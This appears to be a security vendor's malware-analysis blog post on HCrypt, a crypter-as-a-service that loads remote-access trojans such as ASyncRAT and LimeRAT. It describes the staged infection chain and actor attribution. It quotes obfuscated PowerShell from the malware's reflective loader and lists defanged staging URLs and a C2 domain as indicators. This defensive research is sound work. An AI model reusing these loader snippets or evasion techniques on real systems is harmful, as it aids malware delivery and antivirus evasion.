In this post, we will lockpick “HCrypt” – a crypter as a\nservice that is marketed as a FUD (fully undetectable) loader for the client`s RAT of choice. We chose to dissect the crypter’s operations\nalong with tracking several actors that utilize it.\n\n\n-----\n\nFigure 1: The logo from the crypter interface\n\nThe crypter-as-a-service model is indicative of the trend toward malware authors creating and selling code to other groups with less\ntechnical sophistication. As a result, more financially motivated threat actors can adopt better attacks if they have the money to spend.\nThis results in many groups putting forward the bare-minimum effort required to execute sophisticated malware campaigns.\n\n## Technical Introduction\n\nFigure 2: Summarized loader execution flow\n\nOur description of the attack chain flow follows the artifacts that are known to us. Although the initial access infection vector is missing,\nwe have identified cases in which a VBS code is executed that leads to an .hta file execution described as Encoding.txt. The next stages\ninvolve persistence and AV evasion through PowerShell, and then the final stage consists of a standard .Net reflective loader which\nloads the RAT of choice. Along the way, the actors and the author use free accessible code and file sharing services such as github.com,\ncdn.discordapp.com, and minpic.de.\n\nWithin all of its versions, the crypter maintains the same execution flow with different code tweaks in an attempt to avoid detection by AV.\nThe above diagram covers the main Crypter functionality for several versions that we have observed since Jan 2021.\n\n### The First HCrypt Stage: Encoding.txt\n\n‘Encoding.txt’, along with the other .txt file names mentioned in the diagram and within this blog refers to the specific stage internal name\nwithin the crypter application (this will be presented later).\n\nThis is usually the first stage execution (sometimes wrapped in a .vbs file). Its purpose is to elevate the execution flow to PowerShell and\nget the additional code by downloading it from a user-defined custom URL (the user here is the ‘actor’ who uses the crypter).\n\nFigure 3: Encoding txt example\n\n\n-----\n\n### The Second HCrypt Stage: ALL.txt\n\nThis stage’s purpose is to set up persistence along with downloading, saving, and executing the next stage on the victim’s host. Usually,\nit can be identified by the author fingerprint, which names the code`s function “HBar.”\n\nThe name of the saved file, which is also one of the focal fingerprints for this crypter, is ‘Microsoft.ps1’. Usually, this file will refer\neither to an AV bypass or server.txt depends on the version/configuration.\nIf configured by the user (actor), persistence is achieved by downloading and saving a .hta or .vbs file to the victim’s “startup”\ndirectory. This script executes a 1-liner PowerShell code that executes the described Microsoft.ps1 above. Most of the observed\nvariants download this file from a hard-coded URL within the crypter from one of the following author`s GitHub repositories.\n\nhxxps://raw.githubusercontent[.]com/hbankers/PE/main/start.txt\n\nhxxps://raw.githubusercontent[.]com/HCrypter/Startup/main/Startup.txt\n\nCode Block 1: GitHub repositories\n\nIn the newer versions, the author discarded the hard-coded URL and changed it to be user-defined (actor).\n\nFigure 4: ALL.txt example\n\n### The Third HCrypt Stage: AV Bypass\n\nThis PowerShell script function, usually named “HBankers,” may appear on some versions of the HCrypt attack flow. As of this writing the\nAV identification functionality seems to be still in development. The flow of the attack doesn’t change with AV detection.\n\nFigure 5: AV Bypass example\n\n### The Fourth Stage: Server.txt\n\nThe final PowerShell stage often hosted as a jpg file decodes and executes the loader and payload\n\n\n-----\n\nThe loader and payload are hard coded in this stage within a byte array variable, while each version saves it in a different format and\nnames the variable differently (i.e $H1, $nam2021, $brazi). We have observed that those byte arrays contain PE files embedded in Hex,\nDecimal, or Base64 formats and sometimes also with character swapping as a simple encoding.\n\n[Byte[]]$H1=[System.Convert]::FromBase64String('TVqQ##M####E####//8##L##..[deducted]..##=='.Replace('#','A'));\n\nCode Block 2: PowerShell byte array\n\nNext the PowerShell reflectively loads a .Net PE payload in a selected .Net legitimate process through invocation of the loader with given\nparameters.\n\n## $H1 as loader $telegram as payload version\n$Facebook = 'GetVHHJWLUWVXYJHKGP'.Replace('VHHJWLUWVXYJHKGP','Type')\n$Skype = 'GetDWNAXIQOUJPIOVLV'.Replace('DWNAXIQOUJPIOVLV','Method')\n$google =\n'OPZHMTRQSNSGNRKM\\aspnet_compiler.exe'.Replace('OPZHMTRQSNSGNRKM','C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319')\n$chrome = 'InHEYRCJGNURPPGPIL'.Replace('HEYRCJGNURPPGPIL','voke')\n\n[Reflection.Assembly]::Load($H1).$Facebook('HBAR.PING').$Skype('CMD').$chrome($null,[object[]] ($google,$telegram))\n\n## $not as loader $nam2021 as payload version\n\n[Byte[]]$full=VIP $nam2021\n$IP='[SOS]'.replace('OS','ystem.AppDomain')|g;$YAHOO=$IP.GetMethod(\"get_CurrentDomain\")\n$Notepad='$YAHOO.Indonal trumpke($null,$null)'.replace('donal trump','vo')| g\n$VbhodNc113aszaqq='$Notepad.Login facebook($full)'.Replace('gin facebook',)\n$VbhodNc113aszaqq| g\n\n[Byte[]]$google= VIP $not\n$B = 'SOS wh0'.Replace('SOS wh','qw5f')\n$C = '[reSTART]'.Replace('START','rup')| g\n$C::$B('aspnet_compiler.exe',$google)\n\nCode Block 3: PowerShell reflectively loading a .Net PE payload\n\n### The Fifth HCrypt Stage: DLL Loader\n\nThis is a .NET DLL that is embedded by the crypter author. The execution is via the calling convention Namespace->Class>Method\ndefined in Server.txt. We observed that the DLL is often obfuscated by a .NET Reactor or Babel obfuscator.\n\nThe purpose of this DLL is to inject the RAT payload into a hollowed .Net process. We have observed that the crypter hollowed the\nfollowing processes (based on crypter version):\n\nRegsvcs.exe\n\nMSBuild.exe\n\naspnet_compiler.exe\n\ncsc.exe\n\nCode Block 4: Process hollowing\n\n### The Sixth HCrypt Stage: RAT Payload\n\nThe final payload, chosen by the user, is eventually executed within the hollowed process memory. In our analysis we have mostly seen\neither ASyncRAT or LimeRAT, which often come from an open-source RAT platform originally available through the NYANxCAT Github\n[repository (https://github.com/NYAN-x-CAT)](https://github.com/NYAN-x-CAT)\n\n\n-----\n\nFigure 6: LimeRAT Panel\n\nFigure 7: ASync RAT Panel\n\nAdditionally, we have observed a specific case that utilized a Remcos RAT, which has also been distributed via other methods.\n\n## Fingerprinting the Crypter’s Users (Actors)\n\nThe following table emphasizes the different tactics and IOCs that were used within the different variants we observed.\n\n\nRemarks RAT\nVersion\n\n\nObserved 4 different variants from the same crypter version. Each one uses different\nURLs from compromised sites\n\nObserved 3 different variants from 2 crypter versions.

They might\nnot be owned by the author but the following IOCs correlate between them:\n\n\n-----\n\nContent alias: Skype live:hbankers.77\n[Market URL: ‘hxxps://sellix.io/trojan-crypt’](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa3liaktibTJLWlFxWmxCbVdCa0NJTGNnN2V5UXxBQ3Jtc0tuNXh4VGpxcTNoQmhQaUJqQk42M0s3clF5QWRpTnA4WHQ0WDBKZ3VzdGVaZWxWZmd3a0VGRDZTR0pDX2ppSEowQTFDM191c0p4NHdxRmpLOHRwV21jdW9KSzN0cU9FaS1aU0hvbEIzQ3FBQnNuc2NXRQ&q=https%3A%2F%2Fsellix.io%2Ftrojan-crypt)\n\n**HBar (ex. Lx-Crypter)**\n\nFigure 8: HBar YouTube channel icon and theme\n\nAs mentioned in the ALL.txt stage, this channel has the same name as the function within the code.\n\nIn addition to that, one of the videos within this channel is named “Crypter QuasarRAT by HBankers.” “HBankers” is also a function name\nfrom the AV bypass stage and additionally appears in the hard-coded GitHub account name mentioned above. The following video also\ndemonstrates the usage of the URL www.minpic.de for storing the crypter stages.\n\nFigure 9: Utilizing MinPic for storing the crypter stagers\n\nSome of the videos in this channel also provide ‘free’ download links for crypters via mega.nz. We have analyzed two of those crypters\nand found that they contain LimeRAT 0.7NC, which connects to getpass.ddns[.]net:8080 as the C2.\n\n**Trojan - Crypt**\n\nFigure 9: Trojan - Crypt YouTube channel icon and theme\n\nCurrently, it seems that this is the main channel that markets the crypter. We observed that the author’s behavior pattern is that\nwhenever he publishes a new version of HCrypt he tends to delete the older versions of the videos.\n\n\n-----\n\nFigure 10: Trojan - Crypt YouTube channel icon and theme\n\nThe following channel markets several “crypters” along with HCrypt under the same contact alias. An interesting key here is that\n“NYANxCAT” is an alias of a pretty popular user in Hackforums that both sells premium hacking tools and publishes open-source RATs\n[(https://github.com/NYAN-x-CAT). Following that knowledge with some open-source analysis, we believe that this channel is a copy-cat](https://github.com/NYAN-x-CAT)\nthat uses this alias for marketing purposes. A few focal points led us to this conclusion:\n\nOn 08 October 2020, RedSkyAlliance published a post revealing the potential identity of NYANxCAT\n[(https://redskyalliance.org/xindustry/possible-identity-of-a-kuwaiti-hacker-nyanxcat).](https://redskyalliance.org/xindustry/possible-identity-of-a-kuwaiti-hacker-nyanxcat)\n\nWithin this post, there is a link to the NYANxCAT YouTube channel, which is not active anymore, along with the following screenshot\ntaken from one of his videos:\n\nFigure 11: Video uploaded by the legit NYANxCAT taken from the above blog\n\nBrowsing the “copycat” channel we found a similar video:\n\nFigure 12: Video uploaded by the copy-cat NYANxCAT\n\nBy observing the title, submission date, view count, channel icon resolution, and video description it’s clear to say that it was published\non a different channel. Note that the description of the copycat video refers to the previously mentioned Trojan – Crypt account.\n\nOn 30 November 2020, NYANxCAT made a request to delete his account on HackingForums.\n\nFigure 13: NYANxCAT thread in HackingForums\n\n\n-----\n\nNote that he emphasizes the point that he does not have a YouTube channel a point that could mean he was aware of a YouTube\nchannel named NYANxCAT after his personal account was removed.\n\nOn another note, while analyzing the “HBankers” variant, we came across a GitHub URL mentioning a personal name that might reveal\nthe identity of HCrypt’s author.\n\nFigure 14: GitHub URL with possible identity\n\n### HCrypt Interface\n\nFigure 15: v5.6 GUI Interface\n\nThe following picture shows the main GUI interface used in several versions of HCrypt along with the point of view of the crypter user\ncorresponding to the execution flow mentioned above.\n\nAn interesting fingerprint that is hard coded within HCrypt v5.6 is the .pdb path, which assists with triaging executables that were\ncompiled by the author\n\nC:\\Users\\Encoding\\Desktop\\Exploits\\Exp\\HCrypter\\5.6 Update 02\\Build\\obj\\Debug\\HCrypt v5.6.pdb\n\nCode Block 5: The .pdb path\n\n## Conclusions\n\nHCrypt’s defense evasion techniques allow it to bypass the AV and NGAV solutions that rely on detecting attacks and quickly responding\nto them. The technology that underpins Morphisec Guard and Morphisec Keep empowers our users to prevent HCrypt infections through\nthe power of zero-trust security and moving target defense. As a result, Morphisec customers are secured against HCrypt’s evasive\ntechniques.\n\n## IOCs\n\n### .VBS
